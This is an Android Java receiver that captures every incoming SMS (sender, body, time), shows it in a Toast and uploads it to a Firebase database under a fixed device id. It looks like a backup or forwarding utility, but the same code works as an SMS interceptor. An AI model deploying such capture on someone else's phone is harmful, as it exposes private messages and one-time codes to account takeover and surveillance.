package com.example.sms;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Sms extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                // Extracting sender information
                String senderNumber = smsMessage.getDisplayOriginatingAddress();

                // Extracting message body
                String messageBody = smsMessage.getMessageBody();

                // Extracting date and time
                long timestampMillis = smsMessage.getTimestampMillis();
                String dateTime = getFormattedDateTime(timestampMillis);

                saveSmsToFirebase("Pixel",senderNumber, messageBody, timestampMillis);
                // Handle the SMS message, you can log it or display it using Toast
                String smsInfo = "From: " + senderNumber + "\nMessage: " + messageBody + "\nReceived at: " + dateTime;
                Toast.makeText(context, "Sender:"+smsInfo, Toast.LENGTH_SHORT).show();
            }

        }
    }
    private String getFormattedDateTime(long timestampMillis) {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        Date dateTime = new Date(timestampMillis);
        return sdf.format(dateTime);
    }
    private void saveSmsToFirebase(String deviceId,String sender, String messageBody, long timestamp) {
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("sms_messages");

        // Create a unique key for each SMS
        String smsKey = databaseReference.push().getKey();

        // Create a data object to store in the database
        MySmsMessage smsMessage = new MySmsMessage(deviceId,sender, messageBody, timestamp);

        // Save the SMS to the database
        databaseReference.child(smsKey).setValue(smsMessage);
    }
}
